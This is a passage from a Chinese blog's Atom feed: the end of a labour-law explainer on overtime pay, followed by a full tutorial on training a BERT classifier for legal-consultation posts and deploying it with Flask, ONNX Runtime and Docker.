的标准支付加班工资。</p><p><strong>不定时工作制</strong>：有些工作岗位，上下班时间难以固定，一般采用不定时工作制。比如企业中的高级管理人员、外勤人员、推销人员、部分值班人员，因为工作特殊需要或者职责范围，适合实行不定时工作制。在特别需要的情况下，其工作时间可以超过标准工作时间，且超出部分也不算延长工作时间，不给予加班工资。所以，在不定时工作制下，劳动者要求工作日及休息日的加班工资的请求一般得不到支持。</p><p><strong>计件制</strong>：对于计件制的劳动者，劳动者根据自己的工作量实行多劳多得。如果不管劳动者工作多少时间，用人单位均按件数及计件单件支付工资。在这种情况下，实践中一般认为用人单位支付的工资中已包含了加班工资，但如果计得的时薪低于最低工资标准，则按最低工资标准予以补足加班工资。</p><p>这里需注意的是，一般情况下综合计算工时工作制以及不定时工作制<strong>均需劳动部门审批后才可以实施</strong>，如果没有经过审批，用人单位自行规定的或<strong>双方约定的均无效</strong>，视为标准工时制，按标准工时制计付加班工资。</p><p>大部分人应该都是标准工时制了，那么标准工时制下，是否超过 8 小时&#x2F;天，40 小时&#x2F;周 就算加班了呢？根据《劳动法》第四十一条规定，<br>用人单位由于生产经营需要，经与工会和劳动者协商后可以延长工作时间，一般<strong>每日不得超过一小时</strong>；因特殊原因需要延长工作时间的，在保障劳动者身体健康的条件下延长工作时间<strong>每日不得超过三小时，但是每月不得超过三十六小时</strong>。这里的特殊原因，比如发生自然灾害、事故，生产设备、交通运输线路、公共设施发生故障，影响生产和公众利益，必须及时抢修的，具体可以看第四十二条。</p><p>上面是全日制用工，还有<strong>非全日制用工</strong>，就是一般常见的兼职或者小时工。比如一些钟点工，家政人员或者临时工，这部分人员一般是不会计算加班时间，没有加班费的。</p><h2 id="加班事实认定"><a href="#加班事实认定" class="headerlink" title="加班事实认定"></a>加班事实认定</h2><p>在劳动争议中，<strong>加班事实的认定</strong>是非常重要的。本着<span style='color: blue'>谁主张，谁举证</span>的原则，员工主张加班，要自己提供证据证明加班事实，否则就算你长时间工作，法院也是不会认定加班的。</p><p>根据最高人民法院《关于审理劳动争议案件适用法律若干问题的解释（三）》第9条规定，劳动者主张加班费应做到以下几点：（1）首先对加班事实的存在承担初步的举证责任；（2）劳动者有证据证明用人单位掌握加班事实存在的证据，用人单位不提供的，由用人单位承担不利后果。通俗的说，劳动者要么可以直接证明加班的事实，要么需要有证据证明用人单位掌握加班事实存在的证据。</p><p>劳动者提供加班事实证据形式主要有书证和视听资料，包括电子邮件来往、微信群聊天、钉钉系统打卡记录、考勤记录、证明加班的来往机票、汽车的行车仪、打车票、公司网站或期刊文章宣扬的超时工作资料、与公司部门负责人或者HR的录音视频证据证明存在加班的情形。</p><p>此外，《工资支付暂行规定》明确规定，用人单位必须书面记录支付劳动者工资的数额、时间、领取者的姓名以及签字，并保存两年以上备查。注意这里用人单位只需要提供2年以内的，超过2年的部分，用人单位是没有义务提供的。如果劳动者要主张超过两年前部分的加班费，必须由劳动者提供足够的证据资料证明加班事实的存在，实际实践中得到支持的难度还是相当大的。</p><p>如用人单位否认劳动者的加班事实，劳动者需要对<strong>具体加班的时间、加班小时数、加班内容以及是否是被申请人安排其加班</strong>等事实承担举证责任，一旦劳动者无法形成有效证据链，则劳动者主张很难被认可。</p><h3 id="仲裁时效"><a href="#仲裁时效" class="headerlink" title="仲裁时效"></a>仲裁时效</h3><p>这里要补充提一下，申请加班工资要注意仲裁时效。目前司法界主流观点认为加班工资属于劳动报酬，适用特殊时效。也就是说，如果劳动者在职期间，提出加班费主张的，不受仲裁时效限制，理论上可以<strong>追索劳动者在职期间全部的加班费</strong>。但劳动关系解除或终止的，应当自劳动关系解除或终止之日起<strong>一年内提出加班工资仲裁申请</strong>。如果再一年后提出，属于<strong>超过仲裁时效</strong>，其全部的加班费主张均将得不到法律保护。</p><p>不过司法实践中，有一些法官或仲裁员认为，应该从当事人知道或者应当知道其权利被侵害之日起计算1年仲裁时效。还有的法官认为应适用2年时效，且浙江明确规定适用2年时效。这里最好是咨询当地执业律师，才能知道具体怎么操作的。</p><h3 id="有效加班的约定"><a href="#有效加班的约定" class="headerlink" title="有效加班的约定"></a>有效加班的约定</h3><p>还有一个要注意的是，现实中有不少用人单位都有规定，<strong>加班必须报经领导批准，未经领导批准的加班无效，用人单位不支付加班工资</strong>。从用人单位角度来说，这样做可以审查加班的必要性，避免被劳动者薅羊毛，也是有一定道理的。在有这种约定或者制度规定下，如果员工主张加班，但用人单位主张员工加班未获得审批，法院会怎么认定呢？</p><p>从司法实践来说，<strong>一般不会认定加班行为</strong>。不过也有例外，比如员工能够提交证据证明是<strong>接受单位安排从事额外工作</strong>的，<strong>那么有可能被认定存在加班事实</strong>。假设员工提交了上级在下班后为其布置工作任务的微信聊天记录，然后员工按照上级指示，在当天进行工作并反馈工作成果，那么就算未经过用人单位的加班审批，也是可能被认定为加班。</p><h2 id="加班费的计算"><a href="#加班费的计算" class="headerlink" title="加班费的计算"></a>加班费的计算</h2><p>加班费怎么计算也是比较复杂的，需要区分不同的加班情形，《劳动法》第四十四条有规定，下面我整理成一个表格形式，方便理解。</p><table><thead><tr><th></th><th>标准工时制</th><th>综合计算工时制</th><th>不定时工时制</th></tr></thead><tbody><tr><td>工作日</td><td>小时工资*150%</td><td>小时工资*150%</td><td>无</td></tr><tr><td>休息日</td><td>补休或日&#x2F;小时工资*200%</td><td>小时工资*150%</td><td>无</td></tr><tr><td>法定节假日&#x2F;年休假</td><td>日&#x2F;小时工资*300%</td><td>日&#x2F;小时工资*300%</td><td>日&#x2F;小时工资*300%</td></tr></tbody></table><p>这里强调下，对于法定节假日或者年休假加班的，全日制工作制情况下，用人单位必须支付日工资收入的 300%。注意年休假劳动者可以选择不休息，这样就可以拿 3 倍工资。有些用人单位，在员工离职前，会强制要求员工休完年休假，避免支持 3 倍工资，这种做法是不合法的。具体可以参考 <a href="https://www.gov.cn/zhengce/2022-08/31/content_5711300.htm">企业职工带薪年休假实施办法</a>：</p><blockquote><p>第十条  用人单位经职工同意不安排年休假或者安排职工年休假天数少于应休年休假天数，应当在本年度内对职工应休未休年休假天数，按照其日工资收入的300%支付未休年休假工资报酬，其中包含用人单位支付职工正常工作期间的工资收入。</p><p>用人单位安排职工休年休假，但是职工因本人原因且书面提出不休年休假的，用人单位可以只支付其正常工作期间的工资收入。</p></blockquote><p>加班工资的计算基数是本人的基本工资，<strong>一般不包括各项福利补助</strong>等。<a href="https://www.gd.gov.cn/zwgk/wjk/zcfgk/content/post_2532357.html">《广东省工资支付条例》</a>第六十二条对“正常工作时间工资”作出了解释，指的是劳动者在法定工作时间内提供了正常劳动，用人单位依法应当支付的劳动报酬。不包括下列各项：</p><ol><li>延长工作时间工资；</li><li>中班、夜班、高温、低温、井下、有毒有害等特殊工作环境、条件下的津贴；</li><li>法律、法规和国家规定的劳动者福利待遇等。</li></ol><p>其他地方也有以平均工资的 70% 作为加班工资计算基数的规定，具体还是需要看地区规定。用人单位、工会以及职工代表集体协商确定加班工资计算基数应当优先法定的“标准工资”适用。</p><hr><p>我是 <a href="https://selfboot.cn/links">小盛律师</a>，欢迎关注我获取更多法律科普。如果有法律纠纷，欢迎付费咨询。</p><div class="pure-g">  <div class="pure-u-1 pure-u-md-1-3" style="width: auto;">    <img src="https://slefboot-1251736664.file.myqcloud.com/20230914_wx_qrcode_2.png" style="height: 200px; margin-right: 10px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">  </div>  <div class="pure-u-1 pure-u-md-1-3" style="width: auto;">    <img src="https://slefboot-1251736664.file.myqcloud.com/20230914_xhs_qrcode_2.png" style="height: 200px; margin-right: 10px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">  </div>  <div class="pure-u-1 pure-u-md-1-3" style="width: auto;">    <img src="https://slefboot-1251736664.file.myqcloud.com/20230914_dy_qrcode.png" style="height: 200px; margin-right: 10px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">  </div></div>]]></content>
    
    
    <summary type="html">小盛律师详解法定加班标准，如何举证加班事实，加班时间计算方法，针对不同工时制加班费计算公式。一文读懂加班法律常识，解决员工加班无加班费的困扰。</summary>
    
    
    
    <category term="法律普及" scheme="https://selfboot.cn/categories/%E6%B3%95%E5%BE%8B%E6%99%AE%E5%8F%8A/"/>
    
    
    <category term="劳动纠纷" scheme="https://selfboot.cn/tags/%E5%8A%B3%E5%8A%A8%E7%BA%A0%E7%BA%B7/"/>
    
  </entry>
  
  <entry>
    <title>零基础用 Bert 训练并部署文本分类模型</title>
    <link href="https://selfboot.cn/2023/12/06/bert_nlp_classify/"/>
    <id>https://selfboot.cn/2023/12/06/bert_nlp_classify/</id>
    <published>2023-12-06T13:21:13.000Z</published>
    <updated>2024-06-07T06:32:37.901Z</updated>
    
    <content type="html"><![CDATA[<p>之前帮<a href="https://selfboot.cn/links.html">小盛律师</a> 做过一个工具，<strong>定期从网上筛选一些帖子，看看是不是法律咨询类的</strong>。这里就需要对文本进行分类，判断指定帖子正文是不是涉及到法律问题。作为一个后台开发，没接触过自然语言处理，也就之前读书的时候，了解过一些机器学习的基本原理，但是也没有实际做过分类任务。好在现在有 ChatGPT，于是就用它的 API 来做分类。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231130_bert_nlp_classify_index.png" alt="文本分类任务：判定帖子是否是法律咨询"></p><span id="more"></span><p>用 ChatGPT 跑了一段时间，发现用 ChatGPT 用来做分类有两个问题：</p><ol><li><strong>成本贵</strong>。目前用的是 GPT3.5 模型，如果帖子数量多的话，每天也需要几美元。所以现在做法是先用关键词过滤，然后再拿来用 GPT3.5 模型进行分类，这样会漏掉一些没有带关键词的相关帖子。</li><li><strong>误识别</strong>。有些帖子不是法律咨询问题，但是也会被 GPT3.5 误判。这种幻觉问题，试过改进 Prompt，还是不能完全解决。可以看我在 <a href="https://selfboot.cn/2023/08/23/not-smart-chatgpt/#%E6%88%BF%E4%B8%9C%E4%B8%8D%E9%80%80%E6%8A%BC%E9%87%91%EF%BC%9F">真实例子告诉你 ChatGPT 是多会胡编乱造！</a> 里面的例子。</li></ol><p>于是想着自己训练一个模型，用来做文本分类。自然语言处理中最著名的就是 bert 了，这里我基于 <code>bert-base-chinese</code> 训练了一个分类模型，效果还不错。本文主要记录数据集准备、模型训练、模型部署的整个过程，在 ChatGPT 的帮助下，整个过程比想象中简单很多。</p><h2 id="在线体验"><a href="#在线体验" class="headerlink" title="在线体验"></a>在线体验</h2><p>开始之前，先给大家体验下这里的模型(只有博客原文地址才可以体验到)。在下面输入框写一段文本，点击模型实时预测按钮，就可以看到预测结果。由于<strong>个人服务器配置太差</strong>，这里单个预测大概耗时在 2s 左右，同一时间只能处理 1 个请求。如果耗时太久，可以等会再试。</p><div>    <form id="predictionForm">        <label for="content">输入文本:</label><br>        <textarea id="content" name="content" rows="4" cols="50"></textarea><br>        <input type="submit" value="模型实时预测">    </form>    <p id="result"></p>    <script>        document.getElementById('predictionForm').addEventListener('submit', function(e) {            e.preventDefault();            var content = document.getElementById('content').value;            var resultElement = document.getElementById('result');            resultElement.style.color = 'black';             resultElement.textContent = '预测中...';            fetch('https://api.selfboot.cn/predict', {                method: 'POST',                headers: {                    'Content-Type': 'application/json'                },                body: JSON.stringify({ content: content })            })            .then(response => response.json())            .then(data => {                resultElement.textContent = '这' + (data.is_lawer ? '是' : '不是') + "法律咨询问题";                resultElement.style.color = data.is_lawer ? 'green' : 'red';            })            .catch((error) => {                console.error('Error:', error);                resultElement.textContent = '模型预测出错，麻烦重试';            });        });    </script>    <style>    #predictionForm textarea {        width: 100%; /* 确保文本区域宽度是100% */        box-sizing: border-box; /* 内边距和边框包含在宽度内 */        resize: vertical; /* 只允许垂直拉伸 */    }    </style></div><p>比如下面这些就是咨询类文本：</p><blockquote><p>我的车在小区停车位上被撞肇事车跑了，在监控里找到了，他在此事故上应该负什么责任<br>2021年11月份在武安市智慧城跟个人包工头做工，最后拖欠工资不给，请问怎么可以要回?</p></blockquote><p>下面这些为非法律咨询类文本，摘自我博客里的文章标题：</p><blockquote><p>Bazel 缺失依赖导致的 C++ 进程 coredump 问题分析<br>ChatGPT 渗透力分析：搜索热度、需求图谱与人群特征</p></blockquote><h2 id="数据集准备"><a href="#数据集准备" class="headerlink" title="数据集准备"></a>数据集准备</h2><p>训练模型的前提是得有数据集，具体到我这个分类任务，就需要找到很多法律咨询类文本和非法律咨询类文本。</p><p>非法律咨询类的文本很好找，我这里用的是程序员社区 V2EX 上面的帖子内容。V2EX 也提供了方便的 API，可以直接获取到帖子的标题和正文。用了一天时间，大概爬到了 20 万条帖子正文，保存在 postgres 数据库中。其实这的帖子中，也有少量的法律咨询内容，不过整体比例很小，对模型整体训练效果影响应该不大。法律咨询类的文本比较难找，经过一番尝试，最后在一个公开站点上找到了一些，一共是大概 20 万条。</p><p>这里对上面两类文本，分开保存了两个文件，里面每行都是一个 json 文件，包含文本内容。下面是一些样例：</p><table><thead><tr><th>文本内容</th><th>是否咨询</th></tr></thead><tbody><tr><td>起诉离婚会不会查对方或者双方银行卡流水账或者存款。</td><td>是</td></tr><tr><td>被执行人有能力还款，比如说工作收入，月收入4千，每月还一千，但被执行人躲避分文不还，能否对其追责，法律有什么规定吗？</td><td>是</td></tr><tr><td>本人借钱给别人，别人总说还可就是不还，当时没写借条，我想问问怎么办！</td><td>是</td></tr><tr><td>我想找这个安卓游戏 apk 文件里面的图标</td><td>否</td></tr><tr><td>没有开发过服务号，我想问下，服务号收到推送消息，然后点击消息跳转到第三方应用，这个能实现吗？第三方应用没有在应用市场上架</td><td>否</td></tr><tr><td>除了跟竞争对手拼屏占比，看起来酷弦点，实在想不出来有啥实际意义，还是有边框的比较踏实</td><td>否</td></tr></tbody></table><h2 id="模型训练"><a href="#模型训练" class="headerlink" title="模型训练"></a>模型训练</h2><p>数据集准备好了，就可以开始训练模型了。之前没有怎么接触过 bert，也没做过神经网络模型训练，好在有了 ChatGPT，很快就能写一个完整的训练代码。我这里使用 pytorch 进行训练，ChatGPT 给出了完整的训练代码，以及详细的代码解释。中间有任何不懂的地方，都是先问 AI，然后再结合一些资料，来慢慢理解。</p><p>完整的训练脚本在 <a href="https://gist.github.com/selfboot/8a0cb6129d000a01e0e3605f829b62ea">Gist</a> 上，整体流程总结起来如下：</p><ol><li>数据加载与预处理：从 Json 文件中加载数据集，将数据转换为 (文本, 标签) 格式并随机打乱。使用 <code>train_test_split</code> 将数据划分为训练集和验证集。</li><li>使用 <code>BERT Tokenizer</code> 进行编码：使用 BertTokenizer 对文本进行分词和编码，包括添加特殊标记、截断和填充。</li><li>构建数据集和数据加载器：将编码后的数据转换为 TensorDataset。使用 DataLoader 创建训练集和验证集的数据加载器。</li><li>定义<strong>模型、损失函数和优化器</strong>：定义一个包含 BERT 模型和额外分类层的自定义 PyTorch 模型。使用 Focal Loss 作为损失函数，适合处理类别不平衡的问题。使用 AdamW 优化器。</li><li><strong>模型训练和验证</strong>：在训练循环中，按批处理数据、计算损失、反向传播并更新模型参数。在每个训练周期结束时，使用验证集评估模型性能。应用<strong>学习率调度器和早停机制以优化训练过程</strong>。</li><li>性能评估：计算并打印准确度、精确度、召回率和 F1 分数等指标。</li><li>模型保存：在性能提升时保存模型的状态。</li></ol><p>这里甚至都不需要什么神经网络和机器学习的基础，只需要有数据集和 ChatGPT，就能不断调整代码，训练一个效果可以的模型。不过作为有追求的开发，还是想尽力搞明白每行代码背后到底有着什么样的原理，这样才能更好地理解模型训练的过程。除了不断追问 ChatGPT，并对它的回答进行各种验证，这里也发现了一个不错的深度学习入门教程，<a href="https://zh.d2l.ai/index.html">《动手学深度学习》</a>，里面有很多深度学习的知识，还有代码实践，非常适合入门。</p><p>模型的训练离不开 GPU 机器，个人没有好的 GPU 的话，可以用 <a href="https://colab.research.google.com/">Google Colab</a> 上面的 T4 GPU 免费额度来训练。不过内存有限制，训练的时候，注意适当调小 batch_size，我一般在 colab 上用 batch_size&#x3D;16。如果数据集太大，这里训练一轮耗时可能比较就，可能免费额度只够训练几个轮次。</p><h2 id="模型部署"><a href="#模型部署" class="headerlink" title="模型部署"></a>模型部署</h2><p>模型训练完之后，会保存一个 torch 的模型文件 model.pt，怎么用这个模型文件部署一个 http 服务呢？简单来说，可以用 ONNX Runtime + Flask + Gunicorn + Docker + Nginx 来部署。</p><ul><li>ONNX Runtime 是一个高性能的推理引擎，可以用来加载和运行模型。</li><li>Flask 是一个 Python 的 Web 框架，用来写 Web 服务。Gunicorn 是一个 Python WSGI HTTP 服务器，用来启动 Flask 服务。</li><li>Docker 是一个容器化工具，用来打包和运行服务。</li></ul><p>整体部署结构可以参考下图：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231206_bert_nlp_classify_model_server.png" alt="模型部署结构"></p><p>Nginx 接收到 HTTP 请求后，会转发给 Gunicorn，Gunicorn 会启动 Flask 服务，Flask 服务里用加载好的 ONNX 模型文件和推理环境，对请求的文本进行预测，最后返回预测结果。Flask 服务的核心代码很简单，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">session = ort.InferenceSession(<span class="string">&#x27;model.onnx&#x27;</span>)</span><br><span class="line">input_name = session.get_inputs()[<span class="number">0</span>].name</span><br><span class="line">output_name = session.get_outputs()[<span class="number">0</span>].name</span><br><span class="line"></span><br><span class="line">tokenizer = BertTokenizer.from_pretrained(<span class="string">&#x27;./model&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tokenize</span>(<span class="params">content, max_length=<span class="number">512</span></span>):</span><br><span class="line">    encoded = tokenizer.encode_plus(</span><br><span class="line">        content,</span><br><span class="line">        max_length=max_length,</span><br><span class="line">        padding=<span class="string">&#x27;max_length&#x27;</span>,</span><br><span class="line">        truncation=<span class="literal">True</span>,</span><br><span class="line">        return_tensors=<span class="string">&quot;np&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> encoded[<span class="string">&#x27;input_ids&#x27;</span>], encoded[<span class="string">&#x27;attention_mask&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">predict</span>(<span class="params">content</span>):</span><br><span class="line">    input_ids, attention_mask = tokenize(content)</span><br><span class="line">    result = session.run(</span><br><span class="line">        [output_name], &#123;input_name: input_ids, <span class="string">&#x27;attention_mask&#x27;</span>: attention_mask&#125;)</span><br><span class="line">    pred_label = np.argmax(result[<span class="number">0</span>], axis=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> pred_label[<span class="number">0</span>] == <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/predict&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">predict_route</span>():</span><br><span class="line">    content = request.json.get(<span class="string">&#x27;content&#x27;</span>)</span><br><span class="line">    is_lawer = predict(content)</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;is_lawer&#x27;</span>: <span class="number">1</span> <span class="keyword">if</span> is_lawer <span class="keyword">else</span> <span class="number">0</span>&#125;)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>为了方便部署 Gunicorn，Flask以及各种依赖，这里用 Docker 来对其进行打包。Dockerfile 如下：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> python:<span class="number">3.8</span>-slim</span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> requirements.txt .</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pip install --no-cache-dir -r requirements.txt</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pip install gunicorn</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载 BertTokenizer 文件</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> -p /app/model</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> python -c <span class="string">&quot;from transformers import BertTokenizer; tokenizer = BertTokenizer.from_pretrained(&#x27;bert-base-chinese&#x27;); tokenizer.save_pretrained(&#x27;/app/model&#x27;)&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将当前目录内容复制到容器中的 /app</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> . .</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">5000</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;gunicorn&quot;</span>, <span class="string">&quot;-b&quot;</span>, <span class="string">&quot;0.0.0.0:5000&quot;</span>, <span class="string">&quot;run:app&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>然后就可以用下面命令启动服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker build -t lawer_model .</span><br><span class="line">docker stop lawer_model_container &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">docker rm lawer_model_container &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">docker run -d --name lawer_model_container --restart on-failure:5 -p 5000:5000 -v ~/logs:/app/logs lawer_model</span><br></pre></td></tr></table></figure><p>Nginx 反向代理的配置这里就不提了，至此，整个服务已经部署好了。不过为了更好地监控服务，可以用 <strong>Sentry 进行性能监控和错误跟踪</strong>。服务还可以适当增加一些日志，方便排查问题。</p><p>另外，这里我服务域名是 <code>api.selfboot.cn</code>，为了能够在博客页面中访问，还需要放开 CORS 限制，以便允许跨域访问。这里用的是 <code>flask-cors</code>，只需要在 Flask 服务中加上下面这行代码即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CORS(app, resources=&#123;<span class="string">r&quot;/*&quot;</span>: &#123;<span class="string">&quot;origins&quot;</span>: [<span class="string">&quot;https://selfboot.cn&quot;</span>]&#125;&#125;)</span><br></pre></td></tr></table></figure><p>到这里为止，作为演示服务，上面基本够用了。不过要作为一个正式的线上服务，还需要考虑容灾等问题，可能需要引入 k8s 等集群部署方案，这里就不展开了。</p><h2 id="一些不足"><a href="#一些不足" class="headerlink" title="一些不足"></a>一些不足</h2><p>我用这个模型跑了一段时间，发现有些文本分类还不是很准确。比如下面这些也会<strong>被模型误判</strong>为法律咨询问题：</p><blockquote><p>朋友问我借钱，我到底要不要借给他呢？<br>借钱<br>我想咨询下，怎么才能赚更多钱呢？<br>考不上大学，我该怎么办？</p></blockquote><p>这个和数据集还是有很大关系的，在法律咨询的数据集中有很多类似内容，导致模型学习到了错误的特征。有些关键词在咨询中出现频次比较高，导致只要有这些关键词的内容，模型就会偏向于认为是法律咨询。比如只输入 “<strong>借钱</strong>“，”<strong>我想咨询下</strong>“，模型都会判定为法律咨询。为了看到训练集中法律咨询文本的一些关键词分布，用这部分数据生成了词云，如下图：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231206_bert_nlp_classify_dataset_cloud.png" alt="法律咨询文本关键词词云"></p><p>如果想优化这里的话，需要在数据集上下功夫，比如<strong>针对性地增加一些非法律咨询类的文本</strong>，或者对数据集进行一些清洗，去掉一些噪声数据。这里我就没有继续优化了，目前的分类效果已经满足使用了。</p><h2 id="AI-带来的改变"><a href="#AI-带来的改变" class="headerlink" title="AI 带来的改变"></a>AI 带来的改变</h2><p>模型的训练和部署过程，放在以前可能会耗费我大量时间。因为需要查各种资料和文档，然后才能写训练代码，写部署服务，写 docker 配置。但是现在有了 ChatGPT，整个过程没费太多时间。本文的大部分代码都是在 ChatGPT 帮助下完成的，一些配置和细节，也是 ChatGPT 帮我完成的。比如下图中的 onnx 模型推理部分：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231206_bert_nlp_classify_onnx.png" alt="ChatGPT 生成的 onnx 推理代码"></p><p>甚至连数据集的爬取代码，本文体验的输入框前端代码，也都上是 ChatGPT 帮忙完成的。自己要做的就是<strong>拆分任务，描述清楚任务，对 ChatGPT 的回答进行验证</strong>。</p><p><strong>在极大提高效率的同时，ChatGPT 也可以帮忙学习新的领域。</strong>。比如之前对深度学习的理解，就是一知半解，现在实际用到了 bert，过程中也不断加深了深度学习的理解。在学习一个领域过程中，ChatGPT 完全可以充当一个老师的角色，还是那种<strong>能因人施教，可以随时提供帮助</strong>的老师。</p><p>每个人都值得拥有一个 ChatGPT，并尽早和它磨合好，最大限度发挥 AI 的作用。</p>]]></content>
    
    
    <summary type="html">详细介绍了如何从零开始使用BERT模型训练文本分类器，对法律咨询问题进行识别。内容涵盖数据采集、模型构建、训练、部署，配套代码示例，以flask和docker容器化。最大限度降低准入门槛，让任何人都能快速上手，完成一个线上服务。</summary>
    
    
    
    <category term="项目实践" scheme="https://selfboot.cn/categories/%E9%A1%B9%E7%9B%AE%E5%AE%9E%E8%B7%B5/"/>
    
    
    <category term="教程" scheme="https://selfboot.cn/tags/%E6%95%99%E7%A8%8B/"/>
    
    <category term="ChatGPT" scheme="https://selfboot.cn/tags/ChatGPT/"/>
    
  </entry>
  
</feed>
